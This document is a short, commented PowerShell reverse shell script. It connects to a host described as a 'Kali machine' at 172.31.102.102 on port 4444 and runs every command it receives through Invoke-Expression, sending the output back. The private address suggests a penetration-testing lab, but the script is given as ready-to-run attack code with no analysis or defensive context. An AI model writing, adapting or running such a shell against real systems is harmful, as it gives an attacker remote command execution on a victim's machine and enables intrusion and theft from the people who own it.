# IP address of the Kali machine
$IPAddress = '172.31.102.102'

# Port number on which the Kali machine is listening
$Port = 4444

# Create a client for the TCP connection
$client = New-Object System.Net.Sockets.TCPClient

# Connect to the Kali machine
$client.Connect($IPAddress, $Port)

# Get the network stream
$stream = $client.GetStream()

# Create a writer for the stream
$writer = New-Object System.IO.StreamWriter($stream)

# Create a reader for reading commands
$reader = New-Object System.IO.StreamReader($stream)

# Execute commands received from the Kali machine
try {
    while ($true) {
        $cmd = $reader.ReadLine()
        if (($cmd -eq "exit") -or ($cmd -eq $null)) {
            break
        }
        
        # Capture the output from the command execution
        $output = (Invoke-Expression $cmd 2>&1 | Out-String)

        # Write the output back to the Kali machine
        $writer.WriteLine($output)
        $writer.Flush()
    }
}
finally {
    $reader.Close()
    $writer.Close()
    $stream.Close()
    $client.Close()
}
